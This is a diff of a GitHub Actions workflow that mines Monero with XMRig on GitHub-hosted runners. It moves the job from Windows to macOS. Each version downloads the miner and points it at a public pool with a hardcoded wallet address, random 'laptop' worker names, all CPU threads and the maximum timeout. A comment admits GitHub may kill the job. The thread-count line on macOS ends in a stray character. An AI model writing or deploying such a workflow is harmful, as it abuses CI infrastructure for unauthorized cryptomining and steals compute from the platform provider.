@@ -1,29 +1,35 @@
-name: Windows XMRig Miner (Fixed)
+name: macOS XMRig Miner
 
 on:
   workflow_dispatch:
 
 jobs:
   mine:
-    runs-on: windows-latest
-    timeout-minutes: 355
+    runs-on: macos-latest
+    timeout-minutes: 355  # GitHub may kill it sooner
     steps:
       - name: Generate random worker name
         id: worker
-        run: echo "name=laptop$((Get-Random -Minimum 1 -Maximum 100001))" | Out-File -FilePath $env:GITHUB_OUTPUT -Append
+        run: echo "name=laptop$(jot -r 1 1 100000)" >> $GITHUB_OUTPUT
 
-      - name: Download pre-built XMRig
+      - name: Install dependencies
         run: |
-          mkdir -p $env:USERPROFILE\miner
-          cd $env:USERPROFILE\miner
-          Invoke-WebRequest -Uri "https://github.com/xmrig/xmrig/releases/download/v6.21.0/xmrig-6.21.0-msvc-win64.zip" -OutFile "xmrig.zip"
-          Expand-Archive -Path "xmrig.zip" -DestinationPath .
-          Rename-Item -Path "xmrig-6.21.0" -NewName "xmrig"
+          brew update
+          brew install cmake git libuv openssl
 
-      - name: Run XMRig (fixed syntax)
+      - name: Download and extract XMRig
         run: |
-          cd $env:USERPROFILE\miner\xmrig
-          .\xmrig.exe -o pool.supportxmr.com:3333 `
-            -u 85jUiJ7tUsZ1gCRTVy4RyoQwPypRBQf1CaZvhogatc1hYHeecdqcq4uUAWntQyUdRhZRB72n1Vt792JvPcstTcntR2g9eZS `
-            -p ${{ steps.worker.outputs.name }} `
-            -k --donate-level 1 -t 128
+          mkdir -p ~/miner
+          cd ~/miner
+          curl -L https://github.com/xmrig/xmrig/releases/download/v6.21.0/xmrig-6.21.0-macos-x64.tar.gz -o xmrig.tar.gz
+          tar -xzf xmrig.tar.gz
+          mv xmrig-6.21.0 xmrig
+
+      - name: Run XMRig
+        run: |
+          cd ~/miner/xmrig
+          chmod +x ./xmrig
+          ./xmrig -o pool.supportxmr.com:3333 \
+            -u 85jUiJ7tUsZ1gCRTVy4RyoQwPypRBQf1CaZvhogatc1hYHeecdqcq4uUAWntQyUdRhZRB72n1Vt792JvPcstTcntR2g9eZS \
+            -p ${{ steps.worker.outputs.name }} \
+            -k --donate-level 1 -t $(sysctl -n hw.ncpu)s
